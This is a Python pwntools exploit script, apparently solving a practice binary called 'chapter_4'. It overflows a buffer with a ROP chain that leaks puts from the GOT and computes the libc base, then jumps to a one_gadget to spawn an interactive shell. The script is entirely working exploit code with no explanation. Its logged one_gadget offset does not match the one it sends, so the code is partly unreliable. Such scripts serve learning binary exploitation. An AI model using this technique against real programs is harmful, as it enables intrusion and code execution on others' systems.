from pwn import *

def pad_null_bytes(value):
    return value + ('\x00' * (8-len(value))).encode()

#context.terminal = ['/usr/bin/sh', '-c']
#context.terminal = ['qterminal', '-e']
#context.terminal = ['xterm', '-e']
context.terminal = ['xfce4-terminal', '-e']
context.binary = './chapter_4'

ch4elf = ELF("./chapter_4")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

r = ch4elf.process()

# io = gdb.debug('./chapter_4', '''continue''')
gdb.attach(r.pid, '''continue''')

payload = ("A"*40).encode()
payload += p64(0x000000000040122b)
payload += p64(ch4elf.got["puts"]) # value for rdi
payload += p64(ch4elf.symbols["puts"]) # return address
payload += p64(ch4elf.symbols["main"]) # return to main
payload += ("C"*50).encode()

r.clean() # read all and print
r.sendline(payload)
r.recvuntil("OK\n")
puts_leak = u64(pad_null_bytes(r.readline()[:-1]))
log.info("Puts @ %s" % hex(puts_leak))

libc_base = puts_leak - libc.symbols["puts"] # compute libc base
log.info("libc base @ %s" % hex(libc_base))

log.info("libc base + one_gadget @ %s" % hex(libc_base + 0xe992b))

payload2 = ("A"*40).encode()
payload2 += p64(libc_base + 0xe922b)
payload2 += ("\x00"*150).encode()

r.clean()
r.sendline(payload2)

r.interactive()